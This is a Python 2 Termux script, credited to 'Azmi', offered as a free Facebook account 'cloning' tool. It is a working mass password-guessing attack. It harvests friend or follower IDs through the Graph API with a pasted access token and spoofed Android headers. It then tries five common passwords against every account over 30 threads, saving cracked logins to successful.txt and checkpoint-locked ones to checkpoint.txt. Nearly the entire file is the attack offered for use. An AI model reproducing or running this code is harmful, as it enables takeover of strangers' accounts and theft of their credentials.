# -*- coding: utf-8 -*-
#!/usr/bin/python2
#coding=utf-8
#originally written by Azmi
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('termux-setup-storage')
os.system('clear')

logo = """
\t\033[1;92m     █████  ███████ ███    ███ ██
\t\033[1;92m    ██   ██      ██ ████  ████ ██
\t\033[1;92m    ███████   ███   ██ ████ ██ ██
\t\033[1;92m    ██   ██ ██      ██  ██  ██ ██
\t\033[1;92m    ██   ██ ███████ ██      ██ ██
\n\n\t\t\x1b[1;97m   THIS IS FREE TOOL
     """

def reg():
    os.system('clear')
    print logo
    time.sleep(1)
    os.system('fuser -k 5000/tcp &')
    os.system('cd xzee && npm install')
    os.system('cd xzee && node index.js &')
    os.system('clear')
    time.sleep(1)
    login()


def login():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print '\033[1;32m\n\n\t\t\tLogin With Token'
        token = raw_input('\n\n   Paste token here : ')
        sav = open('.login.txt', 'w')
        sav.write(token)
        sav.close()
        menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print '\033[1;91m\n\n\tToken has expired'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login()
    print '\n\n\t\t\033[1;32mLogin User : ' + name
    time.sleep(2)
    crack()


def crack():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '\n\033[1;91m\n\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print '\033[1;92m\n\n [1] Clone From Public'
    print ' [2] Clone From Followers'
    print ' [3] Clone From File'
    crack_select()


def crack_select():
    select = raw_input('\n  Choose : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Password ↠: ')
        p2 = raw_input(' Password ↠: ')
        p3 = raw_input(' Password ↠: ')
        p4 = raw_input(' Password ↠: ')
        p5 = raw_input(' Password ↠: ')
        idt = raw_input('\n\n\x1b[1;92m Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\n Cloning from: ' + q['name']
        except KeyError:
            print '\n\n   Invalid id link'
            raw_input('\n   Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Password ↠: ')
        p2 = raw_input(' Password ↠: ')
        p3 = raw_input(' Password ↠: ')
        p4 = raw_input(' Password ↠: ')
        p5 = raw_input(' Password ↠: ')
        idt = raw_input('\n\n\x1b[1;92m Input id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\n\n\n Cloning from: ' + q['name']
        except KeyError:
            print '\n\n   Invalid id link'
            raw_input('\n   Press enter to back')
            crack()
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
    	os.system('clear')
        print logo
        print '\n\n\t \x1b[1;92m Example Digit: 123 1234 12345 786 '
        p1 = raw_input('\n\n Password ↠: ')
        p2 = raw_input(' Password ↠: ')
        p3 = raw_input(' Password ↠: ')
        p4 = raw_input(' Password ↠: ')
        p5 = raw_input(' Password ↠: ')
        os.system('clear')
        print logo
        try:
            idlist = raw_input('\n\n [+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\n\n   [!] File Not Found.'
            raw_input('\n   Press Enter To Back. ')
            crack()
    else:
        print '\n\tSelect valid option'
        crack_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + p1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + p1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + p1 + '\n')
                ok.close()
                oks.append(uid + p1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + p1 + '\x1b[0;97m'
                cp = open('checkpoint.txt', 'a')
                cp.write(uid + ' | ' + p1 + '\n')
                cp.close()
                cps.append(uid + p1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + p2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + p2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + p2 + '\n')
                    ok.close()
                    oks.append(uid + p2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + p2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + p2 + '\n')
                    cp.close()
                    cps.append(uid + p2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + p3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + p3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + p3 + '\n')
                        ok.close()
                        oks.append(uid + p3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + p3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + p3 + '\n')
                        cp.close()
                        cps.append(uid + p3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + p4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + p4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + p4 + '\n')
                            ok.close()
                            oks.append(uid + p4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + p4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + p4 + '\n')
                            cp.close()
                            cps.apppend(uid + p4)
                        else:
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + p5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
                                 print ' \x1b[1;32m[OK]  \x1b[1;32m' + uid + ' | ' + p5 + '\x1b[0;97m'
                                 ok = open('successful.txt', 'a')
                                 ok.write(uid + ' | ' + p5 + '\n')
                                 ok.close()
                                 oks.append(uid + p5)
                             elif 'www.facebook.com' in q['error']:
                                 print ' \x1b[1;93m[Azmi-5-DAYS] ' + uid + ' | ' + p5 + '\x1b[0;97m'
                                 cp = open('checkpoint.txt', 'a')
                                 cp.write(uid + ' | ' + p5 + '\n')
                                 cp.close()
                                 cps.apppend(uid + p5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' The process has completed'
    print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


reg()
